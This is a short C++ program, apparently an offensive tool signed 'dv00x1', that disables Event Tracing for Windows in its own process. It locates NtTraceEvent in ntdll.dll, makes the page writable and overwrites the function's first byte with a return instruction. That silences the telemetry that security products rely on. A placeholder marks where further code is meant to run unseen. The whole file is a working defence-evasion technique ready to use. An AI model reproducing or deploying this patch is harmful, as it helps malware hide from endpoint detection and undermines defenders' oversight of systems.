#include <windows.h>
#include <iostream>
#include <iomanip>

typedef NTSTATUS(NTAPI* pNtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

void xxxx() {
    std::string banner = R"(


      .__    _______          .__        .__    .___                  __            
      |  |__ \   _  \   _____ |__| ____ |__| __| _/____        _____/  |___  _  __
      |  |  \/  /_\  \ /     \|  |/ ___\|  |/ __ |/ __ \    _/ __ \   __\ \/ \/ /
      |   Y  \  \_/   \  Y Y  \  \  \___|  / /_/ \  ___/    \  ___/|  |  \      / 
 _____|___|  /\_____  /__|_|  /__|\___  >__\____ |\___  >____\___  >__|   \/\_/  
/_____/    \/        \/      \/       \/        \/    \/_____/    \/              
    
                           
                                    by: dv00x1


)";

    std::cout << banner << std::endl;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        std::cerr << "error loading dll: " << GetLastError() << std::endl;
        return;
    }
    std::cout << "[+] ntdll.dll: 0x" << hNtdll << std::endl;

    void* ntTraceEventAddr = GetProcAddress(hNtdll, "NtTraceEvent");
    if (!ntTraceEventAddr) {
        std::cerr << "[-] ntTraceEvent not found" << std::endl;
        return;
    }
    std::cout << "[+] ntTraceEvent: " << ntTraceEventAddr << std::endl;

    pNtProtectVirtualMemory NtProtect = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    if (!NtProtect) {
        std::cerr << "[-] ntProtectVirtualMemory is not found" << std::endl;
        return;
    }

    // viu o teto solar HAHA HAHA HA
    PVOID baseAddress = ntTraceEventAddr;
    SIZE_T size = 1;
    ULONG oldProtect = 0;

    NTSTATUS status = NtProtect(GetCurrentProcess(), &baseAddress, &size, PAGE_EXECUTE_READWRITE, &oldProtect);

    *(unsigned char*)ntTraceEventAddr = 0xC3;
    std::cout << "\n[*] memory patched with 0xC3" << std::endl;

    ULONG finalProtect = 0;
    status = NtProtect(GetCurrentProcess(), &baseAddress, &size, oldProtect, &finalProtect);

    std::cout << "[*] ETW patched successfully." << std::endl;
}

int main() {
    xxxx();
    // your whitehat code here

    return 0;
}